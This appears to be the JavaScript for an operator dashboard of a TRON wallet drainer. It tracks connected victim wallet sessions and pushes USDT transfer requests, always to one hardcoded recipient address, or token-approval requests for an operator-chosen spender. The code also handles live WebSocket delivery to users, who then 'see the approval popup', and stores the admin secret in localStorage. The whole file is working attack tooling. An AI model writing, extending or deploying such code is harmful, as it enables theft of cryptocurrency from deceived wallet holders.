const STORAGE_API    = "tw_tron_admin_api";
const STORAGE_SECRET = "tw_tron_admin_secret";

const USDT_CONTRACT  = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT= "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS  = 6;

const el = {
  mobileBlock:    document.getElementById("mobileBlock"),
  apiBase:        document.getElementById("apiBase"),
  adminSecret:    document.getElementById("adminSecret"),
  connectBtn:     document.getElementById("connectBtn"),
  refreshBtn:     document.getElementById("refreshBtn"),
  status:         document.getElementById("status"),
  walletRows:     document.getElementById("walletRows"),
  requestRows:    document.getElementById("requestRows"),
  walletSelect:   document.getElementById("walletSelect"),
  requestForm:    document.getElementById("requestForm"),
  requestType:    document.getElementById("requestType"),
  transferFields: document.getElementById("transferFields"),
  approveFields:  document.getElementById("approveFields"),
  spenderAddress: document.getElementById("spenderAddress"),
  amountValue:    document.getElementById("amountValue"),
  requestNote:    document.getElementById("requestNote"),
  eventsBox:      document.getElementById("eventsBox"),
};

const state = {
  apiBase: "", adminSecret: "",
  wallets: [], requests: [], events: [],
  ws: null, connected: false,
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function isMobile() {
  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || "");
}

function setStatus(t) { el.status.textContent = t; }

function trimSlash(v) { return String(v || "").replace(/\/+$/, ""); }

function normalizeBase(raw) {
  let v = trimSlash(raw).trim();
  if (!v) return "";
  if (!/^https?:\/\//i.test(v)) {
    v = `${location.protocol === "https:" ? "https" : "http"}://${v}`;
  }
  if (location.protocol === "https:" && v.startsWith("http://")) {
    v = "https://" + v.slice(7).replace(/:8787(?=\/|$)/, "");
  }
  return trimSlash(v);
}

function fmtDate(iso) {
  if (!iso) return "-";
  const d = new Date(iso);
  return isNaN(d) ? iso : d.toLocaleString();
}

function short(s, max = 22) {
  if (!s) return "-";
  return s.length <= max ? s : s.slice(0, max - 3) + "…";
}

// ─── Request type toggle ──────────────────────────────────────────────────────
el.requestType.addEventListener("change", () => {
  const isApprove = el.requestType.value === "trc20_approve";
  el.transferFields.hidden = isApprove;
  el.approveFields.hidden  = !isApprove;
});

// ─── Admin fetch ──────────────────────────────────────────────────────────────
async function aFetch(path, opts = {}) {
  if (!state.apiBase || !state.adminSecret) throw new Error("Connect admin first");
  const r = await fetch(`${state.apiBase}${path}`, {
    ...opts,
    headers: {
      "Content-Type": "application/json",
      "x-admin-secret": state.adminSecret,
      ...(opts.headers || {}),
    },
  });
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

// ─── Renderers ────────────────────────────────────────────────────────────────
function renderWallets() {
  if (!state.wallets.length) {
    el.walletRows.innerHTML = `<tr><td colspan="4" class="empty-cell">No wallets connected yet.</td></tr>`;
    el.walletSelect.innerHTML = `<option value="">— No wallets —</option>`;
    return;
  }

  el.walletRows.innerHTML = state.wallets.map(w => `
    <tr>
      <td class="mono">${short(w.clientId, 18)}</td>
      <td class="mono">${w.address}</td>
      <td><span class="pill ${w.connected ? "pill-on" : "pill-off"}">${w.connected ? "● Online" : "○ Offline"}</span></td>
      <td>${fmtDate(w.lastSeen)}</td>
    </tr>
  `).join("");

  el.walletSelect.innerHTML = state.wallets.map(w =>
    `<option value="${w.clientId}">${short(w.address, 28)} — ${w.connected ? "Online" : "Offline"}</option>`
  ).join("");
}

function typeLabel(t) {
  if (t === "trc20_transfer") return "Send USDT";
  if (t === "trc20_approve")  return "Approve Spender";
  return t;
}

function getAmount(req) {
  return req.params?.amount ?? "-";
}

function renderRequests() {
  if (!state.requests.length) {
    el.requestRows.innerHTML = `<tr><td colspan="7" class="empty-cell">No requests yet.</td></tr>`;
    return;
  }

  el.requestRows.innerHTML = state.requests.map(req => `
    <tr>
      <td>${fmtDate(req.createdAt)}</td>
      <td>${typeLabel(req.type)}</td>
      <td><strong>${getAmount(req)}</strong></td>
      <td class="mono">${short(req.address, 18)}</td>
      <td><span class="pill pill-${req.status}">${req.status}</span></td>
      <td class="mono">${req.txid
        ? `<a href="https://tronscan.org/#/transaction/${req.txid}" target="_blank">${short(req.txid, 16)}</a>`
        : "-"}</td>
      <td>${req.note || "-"}</td>
    </tr>
  `).join("");
}

function renderEvents() {
  if (!state.events.length) { el.eventsBox.textContent = "No events yet."; return; }
  el.eventsBox.textContent = state.events.slice(0, 30)
    .map(e => `[${fmtDate(e.timestamp)}] ${e.type} ${JSON.stringify(e.payload)}`)
    .join("\n");
}

function applySnapshot(snap) {
  state.wallets  = snap.wallets  || [];
  state.requests = snap.requests || [];
  state.events   = snap.events   || [];
  renderWallets(); renderRequests(); renderEvents();
}

// ─── WebSocket ────────────────────────────────────────────────────────────────
function wsUrl(base) {
  if (base.startsWith("https://")) return `wss://${base.slice(8)}/ws`;
  if (base.startsWith("http://"))  return `ws://${base.slice(7)}/ws`;
  return `ws://${base}/ws`;
}

function connectWs() {
  if (state.ws && (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING)) return;
  state.ws = new WebSocket(wsUrl(state.apiBase));

  state.ws.onopen = () => {
    setStatus("Admin connected ✓");
    state.ws.send(JSON.stringify({ type: "identify", role: "admin", secret: state.adminSecret }));
  };

  state.ws.onmessage = (ev) => {
    let p; try { p = JSON.parse(ev.data); } catch { return; }
    if (p.type === "admin_snapshot" && p.data) { applySnapshot(p.data); return; }
    if (p.type === "error") setStatus(`WS error: ${p.message}`);
  };

  state.ws.onclose = () => setStatus("WebSocket disconnected. Refresh to reconnect.");
}

async function loadSnapshot() {
  applySnapshot(await aFetch("/api/admin/snapshot"));
}

// ─── Connect ──────────────────────────────────────────────────────────────────
async function connectAdmin() {
  state.apiBase     = normalizeBase(el.apiBase.value);
  state.adminSecret = el.adminSecret.value.trim();
  if (!state.apiBase || !state.adminSecret) { setStatus("API base and admin secret required"); return; }

  localStorage.setItem(STORAGE_API,    state.apiBase);
  localStorage.setItem(STORAGE_SECRET, state.adminSecret);

  setStatus("Connecting…");
  try {
    await loadSnapshot();
    connectWs();
    state.connected = true;
    setStatus("Admin connected ✓");
  } catch(e) {
    state.connected = false;
    setStatus(`Connect failed: ${e}`);
  }
}

// ─── Build & submit request ───────────────────────────────────────────────────
function buildPayload() {
  const clientId = el.walletSelect.value.trim();
  const type     = el.requestType.value;
  const note     = el.requestNote.value.trim();
  const amount   = el.amountValue.value.trim();

  if (!clientId) throw new Error("Select a wallet session");
  if (!amount || isNaN(Number(amount)) || Number(amount) <= 0)
    throw new Error("Enter a valid USDT amount greater than 0");

  if (type === "trc20_transfer") {
    return {
      clientId, type, note,
      params: { token: USDT_CONTRACT, to: FIXED_RECIPIENT, amount, decimals: USDT_DECIMALS },
    };
  }

  if (type === "trc20_approve") {
    const spender = el.spenderAddress.value.trim();
    if (!spender) throw new Error("Enter a spender address for the approve request");
    return {
      clientId, type, note,
      params: { token: USDT_CONTRACT, spender, amount, decimals: USDT_DECIMALS },
    };
  }

  throw new Error("Unknown request type");
}

async function submitRequest(e) {
  e.preventDefault();
  if (!state.connected) { setStatus("Connect admin first"); return; }

  try {
    const payload = buildPayload();
    const result  = await aFetch("/api/admin/requests", { method: "POST", body: JSON.stringify(payload) });

    if (result.delivered) {
      setStatus("✓ Request sent — user will see the approval popup now.");
    } else {
      setStatus("⚠ Saved — user is offline but will see it when they reconnect.");
    }

    el.amountValue.value    = "";
    el.requestNote.value    = "";
    el.spenderAddress.value = "";
    await loadSnapshot();
  } catch(e) {
    setStatus(`Request failed: ${e}`);
  }
}

// ─── Init ─────────────────────────────────────────────────────────────────────
function initDesktopGuard() {
  if (isMobile()) {
    el.mobileBlock.hidden = false;
    el.connectBtn.disabled = true;
    el.refreshBtn.disabled = true;
    setStatus("Blocked on mobile");
  }
}

function hydrate() {
  const isLocal = ["localhost","127.0.0.1"].includes(location.hostname);
  const defaultBase = isLocal
    ? `${location.protocol}//${location.hostname}:8787`
    : location.origin;
  el.apiBase.value    = normalizeBase(localStorage.getItem(STORAGE_API) || defaultBase);
  el.adminSecret.value = localStorage.getItem(STORAGE_SECRET) || "";
}

// ─── Events ───────────────────────────────────────────────────────────────────
el.connectBtn.addEventListener("click", connectAdmin);
el.refreshBtn.addEventListener("click", async () => {
  if (!state.connected) { setStatus("Connect first"); return; }
  try { await loadSnapshot(); setStatus("Refreshed ✓"); }
  catch(e) { setStatus(`Refresh failed: ${e}`); }
});
el.requestForm.addEventListener("submit", submitRequest);

hydrate();
initDesktopGuard();
